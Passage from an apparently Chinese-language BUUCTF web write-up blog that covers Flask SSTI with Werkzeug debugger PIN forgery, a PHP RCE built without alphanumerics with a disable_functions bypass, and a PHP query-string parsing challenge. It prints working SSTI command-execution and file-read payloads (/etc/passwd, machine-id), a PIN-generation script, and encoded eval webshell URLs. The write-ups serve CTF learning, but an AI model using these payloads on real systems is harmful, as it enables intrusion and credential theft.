class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="SSTI-Flask的pin-FlaskApp"><a href="#SSTI-Flask的pin-FlaskApp" class="headerlink" title="[SSTI,Flask的pin]FlaskApp"></a>[SSTI,Flask的pin]FlaskApp</h1><p><code>base64</code>解码页面随便输入点东西,无法解码时会爆错, 报出一些路径和源码</p>
<img src="/images/buuctf-web2/image-20221024151141347.png" alt="image-20221024151141347" style="zoom:67%;" />

<p>尝试旁边的打开shell选项,提示需要输入PIN码来解锁<img src="/images/buuctf-web2/image-20221024151516929.png" alt="image-20221024151516929" style="zoom:67%;" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can find the PIN printed out on the standard output of your shell that runs the server. </span><br></pre></td></tr></table></figure>

<p>随便输入PIN并抓个包:</p>
<img src="/images/buuctf-web2/image-20221024151744306.png" alt="image-20221024151744306" style="zoom:67%;" />

<p>下拉菜单还能打开:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>) <span class="comment"># 通过post来传的text</span></span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) : <span class="comment"># 有过滤</span></span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">			res =  render_template_string(tmp) <span class="comment"># render函数,存在SSTI</span></span><br></pre></td></tr></table></figure>

<p>那么现在在解密页面输入一些SSTI的payload试试:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">输入: e3s3Kjd9fQ==   &#123;&#123;7*7&#125;&#125;</span><br><span class="line">输出: nonono </span><br><span class="line"></span><br><span class="line">输入: e3s3Kzd9fQ==  &#123;&#123;7+7&#125;&#125;</span><br><span class="line">输出 14</span><br><span class="line">说明 存在对*的过滤</span><br><span class="line"></span><br><span class="line">输入: e3tjb25maWd9fQ==  &#123;&#123;config&#125;&#125;</span><br><span class="line">输出:</span><br><span class="line"> &amp;lt;Config &#123;&amp;#39;ENV&amp;#39;: &amp;#39;production&amp;#39;, &amp;#39;DEBUG&amp;#39;: True, &amp;#39;TESTING&amp;#39;: False, &amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;: None, &amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;: None, &amp;#39;SECRET_KEY&amp;#39;: &amp;#39;s_e_c_r_e_t_k_e_y&amp;#39;, &amp;#39;PERMANENT_SESSION_LIFETIME&amp;#39;: datetime.timedelta(days=31), &amp;#39;USE_X_SENDFILE&amp;#39;: False, &amp;#39;SERVER_NAME&amp;#39;: None, &amp;#39;APPLICATION_ROOT&amp;#39;: &amp;#39;/&amp;#39;, &amp;#39;SESSION_COOKIE_NAME&amp;#39;: &amp;#39;session&amp;#39;, &amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;: False, &amp;#39;SESSION_COOKIE_PATH&amp;#39;: None, &amp;#39;SESSION_COOKIE_HTTPONLY&amp;#39;: True, &amp;#39;SESSION_COOKIE_SECURE&amp;#39;: False, &amp;#39;SESSION_COOKIE_SAMESITE&amp;#39;: None, &amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;: True, &amp;#39;MAX_CONTENT_LENGTH&amp;#39;: None, &amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;: datetime.timedelta(seconds=43200), &amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;: None, &amp;#39;TRAP_HTTP_EXCEPTIONS&amp;#39;: False, &amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;: False, &amp;#39;PREFERRED_URL_SCHEME&amp;#39;: &amp;#39;http&amp;#39;, &amp;#39;JSON_AS_ASCII&amp;#39;: True, &amp;#39;JSON_SORT_KEYS&amp;#39;: True, &amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;: False, &amp;#39;JSONIFY_MIMETYPE&amp;#39;: &amp;#39;application/json&amp;#39;, &amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;: None, &amp;#39;MAX_COOKIE_SIZE&amp;#39;: 4093, &amp;#39;BOOTSTRAP_USE_MINIFIED&amp;#39;: True, &amp;#39;BOOTSTRAP_CDN_FORCE_SSL&amp;#39;: False, &amp;#39;BOOTSTRAP_QUERYSTRING_REVVING&amp;#39;: True, &amp;#39;BOOTSTRAP_SERVE_LOCAL&amp;#39;: False, &amp;#39;BOOTSTRAP_LOCAL_SUBDOMAIN&amp;#39;: None&#125;&amp;gt;</span><br><span class="line"> </span><br><span class="line">SECRET_KEY: s_e_c_r_e_t_k_e_y</span><br></pre></td></tr></table></figure>

<p>这里拿爆出来的<code>SECRET_KEY</code>使用脚本解密了几个<code>session</code>,并没有得到什么有价值的信息:</p>
<p><img src="/images/buuctf-web2/image-20221024160704060.png" alt="image-20221024160704060"></p>
<p>继续试试payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).__dict__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">执行时会爆nonono, 使用字符串拼接的方法一个一个排除关键词:</span><br><span class="line">将import, os, popen都换成字符串拼接的形式后,执行成功</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).__dict__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;ls /&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">输出:</span><br><span class="line">app bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys this_is_the_flag.txt tmp usr var</span><br><span class="line">接下来读取flag: (这里发现flag也被过滤了,所以用同样的方法绕过):</span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).__dict__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;cat /this_is_the_fl&#x27;+&#x27;ag.txt&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>



<p>所以说提示里说要用到PIN,也没用到… 搜搜其他解法:</p>
<blockquote>
<p>PIN是 <code>Werkzeug</code>（它是<code> Flask</code> 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 <strong>您可以使用浏览器中的调试器引脚来启动交互式调试器。</strong></p>
<p>请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。</p>
<p>调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。</p>
<p><code>werkzeug</code>不同版本以及<code>python</code>不同版本都会影响PIN码的生成</p>
</blockquote>
<p>如果需要伪造PIN码,需要:</p>
<ul>
<li><code>username</code>, 读取<code>/etc/passwd</code>获得</li>
<li><code>modname</code>,默认值是<code>flask.app</code></li>
<li><code>appname</code>,默认值是<code>Flask</code></li>
<li>10进制的mac地址, 通过<code>/sys/class/net/eth0/address</code>获得十六进制格式,再转为10进制</li>
<li><code>machine_id</code> :读取文件<code>/etc/machine-id </code> 或者 <code>/proc/sys/kernel/random/boot_id 3./proc/self/cgroup</code></li>
<li><code>flask/app.py</code>的路径, 常见的有:<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code>,通过报错等信息获得</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">输出中找到了一个名为 flaskweb的可疑用户</span><br><span class="line"></span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/sys/class/net/eth0/address&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">输出mac地址56:08:f5:2f:90:51, 转为10进制:94596473262161</span><br><span class="line"></span><br><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/machine-id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">machine-id: 1408f836b0ca514d796cbf8960e45fa1</span><br></pre></td></tr></table></figure>

<p>运行脚本,生成pin:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;94596473262161&#x27;</span>,  <span class="comment"># mac地址  str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>  <span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出: 961-361-247</span></span><br></pre></td></tr></table></figure>

<p>在报错页面输入pin之后,成功进入python的交互页面:</p>
<p><img src="/images/buuctf-web2/image-20221024164345369.png" alt="image-20221024164345369"></p>
<br>

<hr>
<br>

<h1 id="无字母数字rce-disable-function绕过-RCE-ME"><a href="#无字母数字rce-disable-function绕过-RCE-ME" class="headerlink" title="[无字母数字rce,disable_function绕过]RCE ME"></a>[无字母数字rce,disable_function绕过]RCE ME</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很直白,过滤了字母数字, 需要进行无字母数字的<code>rce</code></p>
<p><strong>利用取反性质来构造命令执行, 每一个字符取反之后都会变成另一个字符</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造目标 eval($_POST[1])</span></span><br><span class="line"><span class="comment">//这里构造完之后执行会使网页爆500崩溃...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造目标 assert(eval($_POST[1]))</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;assert&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&quot;eval(\$_POST[1])&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B --assert</span></span><br><span class="line"><span class="comment">//%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6 --eval(\$_POST[1])</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//那么: assert(eval($_POST[1]))就是:</span></span><br><span class="line"><span class="comment">//?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接下来在post中传参: 1=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>成功执行</p>
<img src="/images/buuctf-web2/image-20221024213819145.png" alt="image-20221024213819145" style="zoom:67%;" />

<p>那么现在通过url和<code>post</code>参数就可以使用蚁剑连接了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ce4afe32-8659-4ef4-ad14-633769a475a9.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</span><br></pre></td></tr></table></figure>

<p><img src="/images/buuctf-web2/image-20221024214143688.png" alt="image-20221024214143688"></p>
<p>但是因为这里开启了禁用函数<code>disable_functions</code>所以连接上 蚁剑之后也无法执行命令</p>
<p>而且这里直接打开flag什么也看不见,应该是需要执行旁边的readflag才行</p>
<p><img src="/images/buuctf-web2/image-20221024215657536.png" alt="image-20221024215657536"></p>
<p><img src="/images/buuctf-web2/image-20221024215334052.png" alt="image-20221024215334052"></p>
<p>这里使用<code>disable_function</code>的绕过工具:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>将这两个文件<code>bypass_disablefunc.php</code>和<code>bypass_disablefunc_x64.so</code>上传到目标上(这里<code>/tmp</code>具有上传权限)</p>
<img src="/images/buuctf-web2/image-20221024223546603.png" alt="image-20221024223546603" style="zoom:50%;" />

<img src="/images/buuctf-web2/image-20221024221953485.png" alt="image-20221024221953485" style="zoom:80%;" />

<p>这里上传后需要访问到刚刚上传的php文件,并get传参执行命令:</p>
<blockquote>
<p>一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 &#x2F;tmp&#x2F;xx），便于在页面上显示，另外该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 &#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。此外，bypass_disablefunc.php 拼接命令和输出路径成为完整的命令行，所以你不用在 cmd 参数中重定向。</p>
</blockquote>
<p>这里我们无法访问到<code>/tmp</code>目录的文件,所以通过刚刚的方法,在<code>POST</code>中执行一个文件包含函数:</p>
<p>然后再按照要求传<code>cmd</code>,<code>outpath</code>,<code>sopath</code>这三个参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ce4afe32-8659-4ef4-ad14-633769a475a9.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/tmp/bypass_disablefunc_x64.so</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">1=include(%27/tmp/shell.php%27);</span><br></pre></td></tr></table></figure>

<p>命令被成功执行:</p>
<p><img src="/images/buuctf-web2/image-20221024223414176.png" alt="image-20221024223414176"></p>
<br>

<hr>
<br>

<h1 id="php字符串解析-套娃"><a href="#php字符串解析-套娃" class="headerlink" title="[php字符串解析]套娃"></a>[php字符串解析]套娃</h1><p>源码中, 第一关:…</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>); <span class="comment">//不能有下划线和(%5f是下划线的url编码) </span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&#39;QUERY_STRING&#39;] </code>就是附带的参数的键和值,例如:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/aaa/index.php?p=222&amp;q=333</span><br><span class="line">$_SERVER[&#x27;QUERY_STRING&#x27;] = &quot;p=222&amp;q=333&quot;;</span><br></pre></td></tr></table></figure>

<p>这里利用PHP的字符串解析特性:</p>
<blockquote>
<p><strong>PHP在将查询字符串解析为变量时 会去掉开头的空格,并把一些特殊字符转化为下划线</strong></p>
</blockquote>
<p>下一步绕过正则匹配,这里多传一个换行符, 这里正则默认是不匹配换行符的</p>
<p>所以传:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333%0a</span><br><span class="line">输出:</span><br><span class="line">how smart you are ~</span><br><span class="line"></span><br><span class="line">FLAG is in secrettw.php</span><br></pre></td></tr></table></figure>

<p>进入<code>secrettw.php</code>,这里说<code>Local access only</code>, 可能需要加<code>xff</code>之类的头, 源码中发现了一串编码:</p>
<p><img src="/images/buuctf-web2/image-20221025094059162.png" alt="image-20221025094059162"></p>
<blockquote>
<p><strong>这一串是<code>jsfuck</code>代码,将一切的<code>JavaScript</code>代码混淆为<code>[]()!+,\&quot;$.:;_&#123;&#125;~=</code>这十八个字符的排列组合</strong></p>
<p><strong>这些代码是直接可以在控制台执行的</strong></p>
</blockquote>
<img src="/images/buuctf-web2/image-20221025093937170.png" alt="image-20221025093937170" style="zoom:50%;" />



<p>执行后弹出:<code>alert(&quot;post me Merak)&quot;</code>,这里应该是需要post这个参数</p>
<p><img src="/images/buuctf-web2/image-20221025094723388.png" alt="image-20221025094723388"></p>
<p>这里XFF头不起作用,所以更换为了<code>Client-IP</code>头, 同时按照要求POST一个Merak</p>
<p>得到了下一关的源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 